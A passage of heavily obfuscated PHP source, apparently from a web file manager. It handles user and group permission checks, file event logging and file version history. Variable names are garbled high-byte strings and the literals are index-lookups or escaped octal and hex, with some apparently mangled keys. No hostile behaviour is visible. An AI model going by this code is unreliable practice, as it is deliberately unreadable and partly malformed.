authFolderOwnerGroup($Úœ¶ÃË) { $†šŞ›îÜ =& $_SERVER[ ÇƒŠìÀ]; $èØ¼ŞÎ¨ = Model($†šŞ›îÜ[1977])->where(array($†šŞ›îÜ[1887] => $Úœ¶ÃË))->select(); $Ñ×ï¯± = array(); if (!$èØ¼ŞÎ¨) { return $Ñ×ï¯±; } foreach ($èØ¼ŞÎ¨ as $¢õ÷«æ) { $¼Êç•‘ã = $this->authInfo($¢õ÷«æ); if (AuthModel::authCheckRoot($¼Êç•‘ã[$†šŞ›îÜ[457]])) { $Ñ×ï¯±[] = $¢õ÷«æ[$†šŞ›îÜ[1689]]; } } return $Ñ×ï¯±; } private function authFolderOwnerUser($ÍÕó…öì) { $£„ªÃá¥ =& $_SERVER[ ÇƒŠìÀ]; $ ¢ó†ƒß = array(); $‹¯Ì«© = !1; foreach ($ÍÕó…öì as $ƒÔ–°¨÷) { $ß¸£’†± = $this->authInfo($ƒÔ–°¨÷); if ($ƒÔ–°¨÷[$£„ªÃá¥[540]] == $£„ªÃá¥[214]) { $‹¯Ì«© = !0; } if ($ƒÔ–°¨÷[$£„ªÃá¥[180]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ß¸£’†±[$£„ªÃá¥[457]])) { $ ¢ó†ƒß[] = $ƒÔ–°¨÷[$£„ªÃá¥[540]]; } } } return array($£„ªÃá¥[632] => $ ¢ó†ƒß, $£„ªÃá¥[2098] => $‹¯Ì«©); } public function authMake($Àëà¦´¥, $ÂÚŠØñã = false) { $êªûà¬… =& $_SERVER[ ÇƒŠìÀ]; $««„‹âş = $this->authArrayCheck($Àëà¦´¥, $ÂÚŠØñã); if ($««„‹âş[$êªûà¬…[2100]]) { $««„‹âş[$êªûà¬…[2100]] = $this->sourceAuthInfo($««„‹âş[$êªûà¬…[2100]]); } return $««„‹âş; } public function authArrayCheck($ÛÜ¢Àæ¹, $µö½îª® = false) { $¦ŠÊê =& $_SERVER[ ÇƒŠìÀ]; if (!$ÛÜ¢Àæ¹) { return array($¦ŠÊê[458] => 0, $¦ŠÊê[510] => !1); } $µö½îª® = $µö½îª® ? $µö½îª® : USER_ID; $ãÚÛÙ€‚ = 0; $Ã½Â°éÎ = 0; $©­–ß‚Ó = 0; $º¹Æê©ê = 0; $¤Üè® = 0; $œ¾“ÈàÊ = 0; $†ìó—í = 1000; $ôö­é¿ô = 0; $“ÌÆ‹„ = 0; $„¤¼ò³ = 0; $„»®ˆ©Ë = 0; $¸Ê×Ó®Ù = array($¦ŠÊê[183] => 0); foreach ($ÛÜ¢Àæ¹ as $¸Ê×Ó®Ù) { $ü“š–¼ = $this->authInfo($¸Ê×Ó®Ù); if (!$ü“š–¼) { continue; } $ñô–å”  = $¸Ê×Ó®Ù[$¦ŠÊê[540]]; $Û­ıä = intval($ü“š–¼[$¦ŠÊê[457]]); if ($¸Ê×Ó®Ù[$¦ŠÊê[180]] == SourceModel::TYPE_USER && $ñô–å”  == $µö½îª®) { $ãÚÛÙ€‚ = !0; $©­–ß‚Ó = $ü“š–¼; $Ã½Â°éÎ = $Û­ıä; } else { if ($¸Ê×Ó®Ù[$¦ŠÊê[180]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ñô–å” , $µö½îª®)) { $º¹Æê©ê = !0; $·­—øº = $this->groupStepToUserGroup($ñô–å” , $µö½îª®); if ($·­—øº < $†ìó—í) { $†ìó—í = $·­—øº; $¤Üè® = $Û­ıä; $œ¾“ÈàÊ = $ü“š–¼; $ôö­é¿ô = $ñô–å” ; } if ($·­—øº == $†ìó—í && $Û­ıä >= $¤Üè®) { $¤Üè® = $Û­ıä; $œ¾“ÈàÊ = $ü“š–¼; $ôö­é¿ô = $ñô–å” ; } } else { if ($ñô–å”  == $¦ŠÊê[214]) { $“ÌÆ‹„ = !0; $„»®ˆ©Ë = $ü“š–¼; $„¤¼ò³ = $Û­ıä; } } } } if ($ãÚÛÙ€‚) { $•êŒ¡²Ğ = $Ã½Â°éÎ; $ü“š–¼ = $©­–ß‚Ó; $–²û²œÑ = LNG($¦ŠÊê[2101]); } else { if ($º¹Æê©ê) { $•êŒ¡²Ğ = $¤Üè®; $ü“š–¼ = $œ¾“ÈàÊ; $·íçÒ™á = Model($¦ŠÊê[556])->getInfo($ôö­é¿ô); $–²û²œÑ = $¦ŠÊê[165] . $·íçÒ™á[$¦ŠÊê[560]] . $¦ŠÊê[2102] . LNG($¦ŠÊê[2103]); } else { if ($“ÌÆ‹„) { $•êŒ¡²Ğ = $„¤¼ò³; $ü“š–¼ = $„»®ˆ©Ë; $–²û²œÑ = LNG($¦ŠÊê[2073]); } else { $•êŒ¡²Ğ = 0; $ü“š–¼ = !1; $–²û²œÑ = $¦ŠÊê[12]; } } } $ÚıÛ¡­» = array($¦ŠÊê[2093] => intval($•êŒ¡²Ğ), $¦ŠÊê[2076] => $ü“š–¼, $¦ŠÊê[2094] => $–²û²œÑ, $¦ŠÊê[2085] => $¸Ê×Ó®Ù[$¦ŠÊê[183]]); return $ÚıÛ¡­»; } private function groupContainUser($¤»ãÕŸŒ, $Ï£¤¥ø© = false) { return in_array($¤»ãÕŸŒ, $this->userGroupParents($Ï£¤¥ø©)); } private function groupStepToUserGroup($†°ŸñÆ¡, $åß¬èÀÎ = false) { $¤“è½µŞ =& $_SERVER[ ÇƒŠìÀ]; $…ÇİÀµ = $this->userGroupList($åß¬èÀÎ); $˜ûãÍÙ¸ = 1000; $ğÉ®¾°ù = $GLOBALS[$¤“è½µŞ[6]][$¤“è½µŞ[91]][$¤“è½µŞ[1990]] == 1; $ ÆÄ‘Ú = $ğÉ®¾°ù ? 3 : 2; foreach ($…ÇİÀµ as $™Í‚‚ıÉ) { if ($™Í‚‚ıÉ[$¤“è½µŞ[1887]] == $†°ŸñÆ¡) { return 0; } $åÖì¤Õ¹ = explode($¤“è½µŞ[50], trim($™Í‚‚ıÉ[$¤“è½µŞ[555]], $¤“è½µŞ[50])); if ($åÖì¤Õ¹[0] == $¤“è½µŞ[214] && count($åÖì¤Õ¹) > $ ÆÄ‘Ú) { $³¼ù‰İ = array_reverse(array_slice($åÖì¤Õ¹, $ ÆÄ‘Ú)); $Ó‘Æ½Ÿˆ = array_search($†°ŸñÆ¡, $³¼ù‰İ); if ($Ó‘Æ½Ÿˆ !== !1 && $Ó‘Æ½Ÿˆ + 1 <= $˜ûãÍÙ¸) { $˜ûãÍÙ¸ = $Ó‘Æ½Ÿˆ + 1; } } } return $˜ûãÍÙ¸; } private function userGroupList($®†”°•¿ = false) { $§ğÙ¨¿È =& $_SERVER[ ÇƒŠìÀ]; static $ÀÁÜ·ª = array(); if (isset($ÀÁÜ·ª[$®†”°•¿])) { return $ÀÁÜ·ª[$®†”°•¿]; } $´“—ò¿ = Model($§ğÙ¨¿È[569])->getInfo($®†”°•¿); $ÀÁÜ·ª[$®†”°•¿] = array_to_keyvalue($´“—ò¿[$§ğÙ¨¿È[2074]], $§ğÙ¨¿È[1887]); return $ÀÁÜ·ª[$®†”°•¿]; } public function userGroupParents($¶¤Ú¡ä) { $¹ÎÖÑŞ» =& $_SERVER[ ÇƒŠìÀ]; static $¶¨Ğ’ˆö = array(); $¶¤Ú¡ä = $¶¤Ú¡ä ? $¶¤Ú¡ä : USER_ID; if (isset($¶¨Ğ’ˆö[$¶¤Ú¡ä])) { return $¶¨Ğ’ˆö[$¶¤Ú¡ä]; } $¯¾Œ‹ô = $this->userGroupList($¶¤Ú¡ä); $İë¯Êí€ = array(); $ñš…¤‘ = $GLOBALS[$¹ÎÖÑŞ»[6]][$¹ÎÖÑŞ»[91]][$¹ÎÖÑŞ»[1990]] == 1; $±âûí…¼ = $ñš…¤‘ ? 3 : 2; foreach ($¯¾Œ‹ô as $°Üáêğé) { $âÍˆÒª = array($°Üáêğé[$¹ÎÖÑŞ»[1887]]); $Èæ‹„Š = explode($¹ÎÖÑŞ»[50], trim($°Üáêğé[$¹ÎÖÑŞ»[555]], $¹ÎÖÑŞ»[50])); if ($Èæ‹„Š[0] == $¹ÎÖÑŞ»[214] && count($Èæ‹„Š) > $±âûí…¼) { $ø˜œ” Á = array_slice($Èæ‹„Š, $±âûí…¼); $âÍˆÒª = array_merge($âÍˆÒª, array_reverse($ø˜œ” Á)); } $İë¯Êí€ = array_merge($İë¯Êí€, $âÍˆÒª); } $¶¨Ğ’ˆö[$¶¤Ú¡ä] = array_unique($İë¯Êí€); return $¶¨Ğ’ˆö[$¶¤Ú¡ä]; } public function authTargetInfoMake($×–ñ©ˆá) { $ÙÒÚƒ¢— =& $_SERVER[ ÇƒŠìÀ]; $™°™ = array(); $ÚÌÔÂ…Ä = array(); foreach ($×–ñ©ˆá as $ÆëÆÕà†) { if ($ÆëÆÕà†[$ÙÒÚƒ¢—[180]] == SourceModel::TYPE_USER) { $™°™[] = intval($ÆëÆÕà†[$ÙÒÚƒ¢—[540]]); } else { if ($ÆëÆÕà†[$ÙÒÚƒ¢—[180]] == SourceModel::TYPE_GROUP) { $ÚÌÔÂ…Ä[] = intval($ÆëÆÕà†[$ÙÒÚƒ¢—[540]]); } } } if ($™°™) { $™°™ = Model($ÙÒÚƒ¢—[548])->userListInfo($™°™); } if ($ÚÌÔÂ…Ä) { $îÑ¬­äú = array($ÙÒÚƒ¢—[1975] => array($ÙÒÚƒ¢—[462], $ÚÌÔÂ…Ä)); $ÚÌÔÂ…Ä = Model($ÙÒÚƒ¢—[556])->field($ÙÒÚƒ¢—[2104])->where($îÑ¬­äú)->select(); $ÚÌÔÂ…Ä = array_to_keyvalue($ÚÌÔÂ…Ä, $ÙÒÚƒ¢—[1887]); } return array($ÙÒÚƒ¢—[2105] => $™°™, $ÙÒÚƒ¢—[2106] => $ÚÌÔÂ…Ä); } public function authInfo($ŞåÓà) { $âÆ¾´¸¿ =& $_SERVER[ ÇƒŠìÀ]; if ($ŞåÓà[$âÆ¾´¸¿[1991]]) { $¿ÅÍÁş = Model($âÆ¾´¸¿[542])->listData($ŞåÓà[$âÆ¾´¸¿[1991]]); if (!$¿ÅÍÁş) { return !1; $ô«•À“Ÿ = Model($âÆ¾´¸¿[542])->listData(); $ç¿´üÄå = array_filter_by_field($ô«•À“Ÿ, $âÆ¾´¸¿[457], $âÆ¾´¸¿[214]); return $ç¿´üÄå; } $„£É„È = array_field_key($¿ÅÍÁş, array($âÆ¾´¸¿[445], $âÆ¾´¸¿[32], $âÆ¾´¸¿[457], $âÆ¾´¸¿[1910], $âÆ¾´¸¿[1911])); $„£É„È[$âÆ¾´¸¿[2107]] = $ŞåÓà; return $„£É„È; } else { return array($âÆ¾´¸¿[463] => 0, $âÆ¾´¸¿[1893] => $ŞåÓà[$âÆ¾´¸¿[2051]], $âÆ¾´¸¿[464] => $âÆ¾´¸¿[12], $âÆ¾´¸¿[1910] => $âÆ¾´¸¿[2108]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\x72\143\145\x5f\x65\166\145\156\164"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\124\x69\155\x65", "\164\x69\x6d\145", "\151\x6e\163\x65\162\x74", "\x66\165\156\143\x74\x69\157\156"), array("\x64\145\163\143", '', "\x69\156\163\145\x72\x74\54\165\x70\x64\141\x74\x65\x2c\x73\x65\154\x65\143\164", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($£÷³Ê–, $¨ó÷¤—·, $Ø¼Œõ… = '') { $â¸±òùé =& $_SERVER[ ÇƒŠìÀ]; if (!$this->eventSave) { return; } $´çöÇ­ = Model($â¸±òùé[1368])->sourceInfo($£÷³Ê–); if (!$´çöÇ­) { return !1; } if ($this->isCacheEvent($´çöÇ­, $¨ó÷¤—·)) { return; } if ($Ø¼Œõ… && is_string($Ø¼Œõ…)) { $Ø¼Œõ… = array($â¸±òùé[1926] => $Ø¼Œõ…); } $Ã¢ÕäÖÁ = defined($â¸±òùé[2109]) ? USER_ID : 0; $®ïòÃØÜ = array($â¸±òùé[461] => $£÷³Ê–, $â¸±òùé[2110] => $´çöÇ­[$â¸±òùé[182]], $â¸±òùé[2111] => $´çöÇ­[$â¸±òùé[32]], $â¸±òùé[553] => !empty($´çöÇ­[$â¸±òùé[553]]) ? $´çöÇ­[$â¸±òùé[553]] : $â¸±òùé[12], $â¸±òùé[1680] => $Ã¢ÕäÖÁ, $â¸±òùé[466] => $¨ó÷¤—·, $â¸±òùé[1682] => $Ø¼Œõ…); $this->addSystemLog($¨ó÷¤—·, $®ïòÃØÜ); unset($®ïòÃØÜ[$â¸±òùé[2111]], $®ïòÃØÜ[$â¸±òùé[553]]); return $this->add($®ïòÃØÜ); } private function addSystemLog($ø¯Ò«Î, $şÇñîİ) { $ª¢¹°º¥ =& $_SERVER[ ÇƒŠìÀ]; if ($ø¯Ò«Î == $ª¢¹°º¥[2112]) { $ø¯Ò«Î = $şÇñîİ[$ª¢¹°º¥[496]][$ª¢¹°º¥[2113]]; } else { if (in_array($ø¯Ò«Î, array($ª¢¹°º¥[1867], $ª¢¹°º¥[2114]))) { $ø¯Ò«Î = $şÇñîİ[$ª¢¹°º¥[496]][$ª¢¹°º¥[783]]; } } $¡¨„Á­Ì = array_merge($şÇñîİ, array($ª¢¹°º¥[2115] => $şÇñîİ[$ª¢¹°º¥[183]], $ª¢¹°º¥[2116] => $şÇñîİ[$ª¢¹°º¥[2116]])); Hook::trigger($ª¢¹°º¥[2117], $ª¢¹°º¥[2118] . $ø¯Ò«Î, $şÇñîİ); Model($ª¢¹°º¥[1831])->addLog($ª¢¹°º¥[2118] . $ø¯Ò«Î, $¡¨„Á­Ì); } private function isCacheEvent($†ƒÙÇµ, $ãş¡ÆÚĞ) { if ($†ƒÙÇµ[$_SERVER[ ÇƒŠìÀ][180]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ûÜò¿Ãë, $Å³™ä‘) { $³µãÖãÓ =& $_SERVER[ ÇƒŠìÀ]; $ŞÂİß€ = Model($³µãÖãÓ[1368])->sourceInfo($ûÜò¿Ãë); $ªÃŸÃ¥¤ = array($³µãÖãÓ[2113] => $Å³™ä‘, $³µãÖãÓ[32] => $ŞÂİß€[$³µãÖãÓ[32]]); return $this->addEvent($ûÜò¿Ãë, $³µãÖãÓ[2112], $ªÃŸÃ¥¤); } public function eventFileEdit($ö€­ˆÉ) { $ÕºŒòŞ =& $_SERVER[ ÇƒŠìÀ]; $Ûé€ñˆ‚ = array($ÕºŒòŞ[2119] => $_SERVER[$ÕºŒòŞ[2120]], $ÕºŒòŞ[2121] => strtolower(ACTION)); if (isset($GLOBALS[$ÕºŒòŞ[7]][$ÕºŒòŞ[2122]])) { $Ûé€ñˆ‚[$ÕºŒòŞ[2122]] = $ÕºŒòŞ[90]; } return $this->addEvent($ö€­ˆÉ, $ÕºŒòŞ[1857], $Ûé€ñˆ‚); } public function eventRecycle($¢ã™Íº‹, $…¶í›Œ©) { return $this->addEvent($¢ã™Íº‹, $_SERVER[ ÇƒŠìÀ][2114], $…¶í›Œ©); } public function eventRemove($ê”ê’¸) { $ŒÊÄ´ï =& $_SERVER[ ÇƒŠìÀ]; $¸ÙÌ£ç‘ = Model($ŒÊÄ´ï[1368])->sourceInfo($ê”ê’¸); $À°†ÍĞ§ = $¸ÙÌ£ç‘[$ŒÊÄ´ï[32]]; return $this->addEvent($¸ÙÌ£ç‘[$ŒÊÄ´ï[182]], $ŒÊÄ´ï[1856], $À°†ÍĞ§); } public function eventShare($€ˆ÷•, $ÙêóÂÑî) { return $this->addEvent($€ˆ÷•, $_SERVER[ ÇƒŠìÀ][1867], $ÙêóÂÑî); } public function eventMove($÷·‹½ƒï, $ı«âÖÕ, $ûØÕÚı) { $–ØËªÓÚ =& $_SERVER[ ÇƒŠìÀ]; $œò¼¬Ãâ = Model($–ØËªÓÚ[1368]); $ÔÅ™ªë° = $œò¼¬Ãâ->sourceInfo($÷·‹½ƒï); $­¢ı«øã = $œò¼¬Ãâ->sourceInfo($ı«âÖÕ); $Ó»ÃØ¥‚ = $œò¼¬Ãâ->sourceInfo($ûØÕÚı); $ˆùıûÓ = array($–ØËªÓÚ[1195] => $ı«âÖÕ, $–ØËªÓÚ[2123] => $­¢ı«øã[$–ØËªÓÚ[32]], $–ØËªÓÚ[2100] => !empty($­¢ı«øã[$–ØËªÓÚ[553]]) ? $­¢ı«øã[$–ØËªÓÚ[553]] : $–ØËªÓÚ[12], $–ØËªÓÚ[1196] => $ûØÕÚı, $–ØËªÓÚ[2124] => $Ó»ÃØ¥‚[$–ØËªÓÚ[32]], $–ØËªÓÚ[2125] => !empty($Ó»ÃØ¥‚[$–ØËªÓÚ[553]]) ? $Ó»ÃØ¥‚[$–ØËªÓÚ[553]] : $–ØËªÓÚ[12]); $this->addEvent($÷·‹½ƒï, $–ØËªÓÚ[590], $ˆùıûÓ); $ÔÅ™ªë° = $œò¼¬Ãâ->sourceInfo($÷·‹½ƒï); $ˆùıûÓ = array($–ØËªÓÚ[183] => $ÔÅ™ªë°[$–ØËªÓÚ[183]], $–ØËªÓÚ[32] => $ÔÅ™ªë°[$–ØËªÓÚ[32]]); $this->addEvent($ı«âÖÕ, $–ØËªÓÚ[2126], $ˆùıûÓ); } public function eventCopy($ùÏÇÕ†ñ) { $this->eventCreate($ùÏÇÕ†ñ, $_SERVER[ ÇƒŠìÀ][588]); } public function eventRename($“§İşÕÎ, $…Äú´ëë, $ëÔï­éé) { $ı’Í‰Åê =& $_SERVER[ ÇƒŠìÀ]; $„Íğê¬ = array($ı’Í‰Åê[1195] => $…Äú´ëë, $ı’Í‰Åê[1196] => $ëÔï­éé); return $this->addEvent($“§İşÕÎ, $ı’Í‰Åê[1382], $„Íğê¬); } public function eventAddComment($œƒ²œ, $è¤²•) { return $this->addEvent($œƒ²œ, $_SERVER[ ÇƒŠìÀ][2127], $è¤²•); } public function eventAddDesc($á½“´€’, $úºÇòàí) { return $this->addEvent($á½“´€’, $_SERVER[ ÇƒŠìÀ][2128], $úºÇòàí); } public function listBySource($Ç£«àùÌ) { $”÷û‹©É =& $_SERVER[ ÇƒŠìÀ]; $äéåÅµÂ = Model($”÷û‹©É[1368])->sourceInfo($Ç£«àùÌ); $­¬¾® = array($”÷û‹©É[461] => $Ç£«àùÌ); if ($äéåÅµÂ[$”÷û‹©É[455]] == $”÷û‹©É[90]) { $™³”×¨ = Model($”÷û‹©É[1368])->listSearchChildren($Ç£«àùÌ, 20000); $™³”×¨[] = $Ç£«àùÌ . $”÷û‹©É[424]; $­¬¾® = array($”÷û‹©É[183] => array($”÷û‹©É[7], $™³”×¨)); } $ğÊ¹¬æ¢ = $this->where($­¬¾®)->order($”÷û‹©É[2129])->selectPage(); if ($ğÊ¹¬æ¢[$”÷û‹©É[412]][$”÷û‹©É[413]] == 0) { $ğÊ¹¬æ¢[$”÷û‹©É[412]][$”÷û‹©É[413]] = 1; $ğÊ¹¬æ¢[$”÷û‹©É[415]] = array(array($”÷û‹©É[461] => $Ç£«àùÌ, $”÷û‹©É[2110] => $äéåÅµÂ[$”÷û‹©É[182]], $”÷û‹©É[1680] => $äéåÅµÂ[$”÷û‹©É[497]], $”÷û‹©É[466] => $”÷û‹©É[2130], $”÷û‹©É[467] => $äéåÅµÂ[$”÷û‹©É[217]], $”÷û‹©É[1682] => $”÷û‹©É[12])); } return $this->eventListParse($ğÊ¹¬æ¢, $Ç£«àùÌ); } private function eventListParse($ëœÉÒ, $­Ã¤Ÿäë) { $ÇÎíÇØ =& $_SERVER[ ÇƒŠìÀ]; $ª³‡ç¡Ğ = $ëœÉÒ[$ÇÎíÇØ[415]]; $ÓëÙ¨ê = array_to_keyvalue($ª³‡ç¡Ğ, $ÇÎíÇØ[12], $ÇÎíÇØ[183]); $ŠÛÁÚŠ = array_to_keyvalue($ª³‡ç¡Ğ, $ÇÎíÇØ[12], $ÇÎíÇØ[2116]); foreach ($ª³‡ç¡Ğ as $‡œöºœê) { $­Áü •ó = $‡œöºœê[$ÇÎíÇØ[496]]; if ($‡œöºœê[$ÇÎíÇØ[33]] == $ÇÎíÇØ[590] && isset($­Áü •ó[$ÇÎíÇØ[1195]])) { $ÓëÙ¨ê[] = $­Áü •ó[$ÇÎíÇØ[1195]] . $ÇÎíÇØ[12]; $ÓëÙ¨ê[] = $­Áü •ó[$ÇÎíÇØ[1196]] . $ÇÎíÇØ[12]; } if ($‡œöºœê[$ÇÎíÇØ[33]] == $ÇÎíÇØ[2126] && isset($­Áü •ó[$ÇÎíÇØ[183]])) { $ÓëÙ¨ê[] = $­Áü •ó[$ÇÎíÇØ[183]] . $ÇÎíÇØ[12]; } } $ÓëÙ¨ê = array_merge($ÓëÙ¨ê, $ŠÛÁÚŠ, array($­Ã¤Ÿäë . $ÇÎíÇØ[12])); $ÓëÙ¨ê = array_unique($ÓëÙ¨ê); $¾¢Èğ•ç = array_unique(array_to_keyvalue($ª³‡ç¡Ğ, $ÇÎíÇØ[12], $ÇÎíÇØ[1689])); $üí—•Ü¡ = Model($ÇÎíÇØ[569])->userListInfo($¾¢Èğ•ç); $óÜÇ„ ƒ = Model($ÇÎíÇØ[854])->sourceListInfo($ÓëÙ¨ê, !0); foreach ($ª³‡ç¡Ğ as &$‡œöºœê) { if ($‡œöºœê[$ÇÎíÇØ[33]] == $ÇÎíÇØ[590] && isset($‡œöºœê[$ÇÎíÇØ[496]][$ÇÎíÇØ[1195]])) { $‡œöºœê[$ÇÎíÇØ[496]][$ÇÎíÇØ[1195]] = $óÜÇ„ ƒ[$‡œöºœê[$ÇÎíÇØ[496]][$ÇÎíÇØ[1195]]]; $‡œöºœê[$ÇÎíÇØ[496]][$ÇÎíÇØ[1196]] = $óÜÇ„ ƒ[$‡œöºœê[$ÇÎíÇØ[496]][$ÇÎíÇØ[1196]]]; } if ($‡œöºœê[$ÇÎíÇØ[33]] == $ÇÎíÇØ[2126] && isset($‡œöºœê[$ÇÎíÇØ[496]][$ÇÎíÇØ[183]])) { $‡œöºœê[$ÇÎíÇØ[496]][$ÇÎíÇØ[183]] = $óÜÇ„ ƒ[$‡œöºœê[$ÇÎíÇØ[496]][$ÇÎíÇØ[183]]]; } $‡œöºœê[$ÇÎíÇØ[89]] = $óÜÇ„ ƒ[$‡œöºœê[$ÇÎíÇØ[183]]]; $‡œöºœê[$ÇÎíÇØ[2131]] = $óÜÇ„ ƒ[$‡œöºœê[$ÇÎíÇØ[2116]]]; if ($‡œöºœê[$ÇÎíÇØ[33]] == $ÇÎíÇØ[1856]) { $‡œöºœê[$ÇÎíÇØ[2131]] = $‡œöºœê[$ÇÎíÇØ[89]]; $‡œöºœê[$ÇÎíÇØ[2116]] = $‡œöºœê[$ÇÎíÇØ[2131]][$ÇÎíÇØ[183]]; $‡œöºœê[$ÇÎíÇØ[89]] = !1; $‡œöºœê[$ÇÎíÇØ[183]] = $ÇÎíÇØ[12]; } $‡œöºœê[$ÇÎíÇØ[2059]] = $üí—•Ü¡[$‡œöºœê[$ÇÎíÇØ[1689]]]; } unset($‡œöºœê); $ëœÉÒ[$ÇÎíÇØ[415]] = $ª³‡ç¡Ğ; return $ëœÉÒ; } public function removeBySource($¤¦åÓ‘ß) { $Ÿ¶Õ¦ö = array($_SERVER[ ÇƒŠìÀ][461] => $¤¦åÓ‘ß); $this->where($Ÿ¶Õ¦ö)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\162\143\x65\137\150\x69\163\164\x6f\162\x79"; public function historyCount($¬ìÌÉúÏ) { $Ü§–Øëù =& $_SERVER[ ÇƒŠìÀ]; if (!$¬ìÌÉúÏ) { return array(); } if (is_string($¬ìÌÉúÏ) || is_int($¬ìÌÉúÏ)) { $¬ìÌÉúÏ = array($¬ìÌÉúÏ); } $¥Äà‰Ëë = array($Ü§–Øëù[183], $Ü§–Øëù[1920] => $Ü§–Øëù[536]); $®÷ˆïÉş = array($Ü§–Øëù[183] => array($Ü§–Øëù[7], $¬ìÌÉúÏ)); $–Ì°¢ÂÛ = $this->field($¥Äà‰Ëë)->where($®÷ˆïÉş)->group($Ü§–Øëù[183])->select(); return array_to_keyvalue($–Ì°¢ÂÛ, $Ü§–Øëù[183], $Ü§–Øëù[536]); } public function addHistory($«ƒ£Äòë, $ª¬´–áı = '') { $à™Œ‘æ =& $_SERVER[ ÇƒŠìÀ]; $ış…Úô = array($à™Œ‘æ[461] => $«ƒ£Äòë[$à™Œ‘æ[183]], $à™Œ‘æ[1680] => isset($«ƒ£Äòë[$à™Œ‘æ[499]]) ? $«ƒ£Äòë[$à™Œ‘æ[499]] : $«ƒ£Äòë[$à™Œ‘æ[497]], $à™Œ‘æ[512] => $«ƒ£Äòë[$à™Œ‘æ[511]], $à™Œ‘æ[587] => $«ƒ£Äòë[$à™Œ‘æ[78]], $à™Œ‘æ[2132] => $ª¬´–áı); if ($GLOBALS[$à™Œ‘æ[6]][$à™Œ‘æ[91]][$à™Œ‘æ[1252]] >= 1) { $this->historyAutoClear($ış…Úô[$à™Œ‘æ[183]]); $this->add($ış…Úô); } Hook::trigger($à™Œ‘æ[2133], $ış…Úô); Model($à™Œ‘æ[2134])->eventFileEdit($«ƒ£Äòë[$à™Œ‘æ[183]]); } private function historyAutoClear($ğ‡ßŠ¾¯) { $ÕÛËƒÓ =& $_SERVER[ ÇƒŠìÀ]; $Ø…Šê½µ = Model($ÕÛËƒÓ[799])->get($ÕÛËƒÓ[1274]); $œªú¿ú = intval($GLOBALS[$ÕÛËƒÓ[6]][$ÕÛËƒÓ[91]][$ÕÛËƒÓ[1252]]); $Ïô£ç = $Ø…Šê½µ == $ÕÛËƒÓ[1275] ? min(5, $œªú¿ú) : $œªú¿ú; $Ïô£ç = $Ïô£ç <= 0 ? 0 : $Ïô£ç - 1; if ($Ïô£ç >= 500) { return; } $¦’§ÚÙ = array($ÕÛËƒÓ[461] => $ğ‡ßŠ¾¯); $şâæÏ£² = $this->field($ÕÛËƒÓ[2135])->where($¦’§ÚÙ)->order($ÕÛËƒÓ[2129])->select(); if (!$şâæÏ£² || $Ïô£ç >= count($şâæÏ£²)) { return; } $è¸Š¤è = array_to_keyvalue($şâæÏ£², $ÕÛËƒÓ[12], $ÕÛËƒÓ[445]); $è¸Š¤è = array_slice($è¸Š¤è, $Ïô£ç); $×¸ä¢†Ü = array_to_keyvalue($şâæÏ£², $ÕÛËƒÓ[12], $ÕÛËƒÓ[511]); $×¸ä¢†Ü = array_slice($×¸ä¢†Ü, $Ïô£ç); if (!$è¸Š¤è || !$×¸ä¢†Ü) { return; } $¦’§ÚÙ = array($ÕÛËƒÓ[463] => array($ÕÛËƒÓ[7], $è¸Š¤è)); $this->where($¦’§ÚÙ)->delete(); Model($ÕÛËƒÓ[514])->remove($×¸ä¢†Ü); } public function listData($¾§ÊóÃÄ) { $ÎÇ½ŞÊš =& $_SERVER[ ÇƒŠìÀ]; $òøï•ßŒ = array($ÎÇ½ŞÊš[461] => $¾§ÊóÃÄ); $¤è©‰À = $ÎÇ½ŞÊš[2136]; $¼“°ù× = $this->field($¤è©‰À)->where($òøï•ßŒ)->order($ÎÇ½ŞÊš[2129])->selectPage(); $this->_listAppendUser($¼“°ù×[$ÎÇ½ŞÊš[415]]); $Š—á²ŒÕ = Model($ÎÇ½ŞÊš[799])->get($ÎÇ½ŞÊš[1274]); $ÒÆã¯”ƒ = 5; if ($Š—á²ŒÕ == $ÎÇ½ŞÊš[1275]) { $¼“°ù×[$ÎÇ½ŞÊš[415]] = array_slice($¼“°ù×[$ÎÇ½ŞÊš[415]], 0, $ÒÆã¯”ƒ); $¼“°ù×[$ÎÇ½ŞÊš[412]] = array($ÎÇ½ŞÊš[2137] => 1, $ÎÇ½ŞÊš[2138] => 20, $ÎÇ½ŞÊš[2139] => 1, $ÎÇ½ŞÊš[2140] => count($¼“°ù×[$ÎÇ½ŞÊš[415]])); } return $¼“°ù×; } protected function _listAppendUser(&$›ùÁğ€û) { $¡öÚ =& $_SERVER[ ÇƒŠìÀ]; $ùîÔÊ’ = array_to_keyvalue($›ùÁğ€û, $¡öÚ[12], $¡öÚ[1689]); $¡ˆÉÅ•© = Model($¡öÚ[569])->userListInfo($ùîÔÊ’); foreach ($›ùÁğ€û as &$‹ã¯¶·Ó) { $ê Ëşû‚ = $‹ã¯¶·Ó[$¡öÚ[1689]]; $‹ã¯¶·Ó[$¡öÚ[497]] = $¡ˆÉÅ•©[$ê Ëşû‚] ? $¡ˆÉÅ•©[$ê Ëşû‚] : !1; } unset($‹ã¯¶·Ó); } public function fileInfo($ô½€Œˆ) { $Ø­õÂÁ =& $_SERVER[ ÇƒŠìÀ]; $®¬…è¾À = $this->tablePrefix; $—ö»ÂÊµ = "{$®¬…è¾À}\151\x6f\x5f\x66\151\x6c\x65\x20\146\151\154\x65\163\40\x6f\156\x20\146\x69\x6c\145\163\x2e\146\151\x6c\x65\111\x44\x20\x3d\40\x68\x69\x73\x74\x6f\x72\x79\x2e\x66\x69\x6c\x65\111\104"; return $this->alias($Ø­õÂÁ[2141])->where(array($Ø­õÂÁ[463] => $ô½€Œˆ))->join($—ö»ÂÊµ, $Ø­õÂÁ[2142])->find(); } public function removeItem($İ·«Îáä) { $¥üò‰©Ï =& $_SERVER[ ÇƒŠìÀ]; $ÒË…§Á¢ = array($¥üò‰©Ï[463] => $İ·«Îáä); $£ÏÅ¢æÏ = $this->where($ÒË…§Á¢)->find(); if ($£ÏÅ¢æÏ) { $ã®Û’Ö® = $this->where($ÒË…§Á¢)->delete(); Model($¥üò‰©Ï[514])->remove($£ÏÅ¢æÏ[$¥üò‰©Ï[511]]); return $ã®Û’Ö®; } return !1; } public function removeBySource($êÛø×Í‡) { 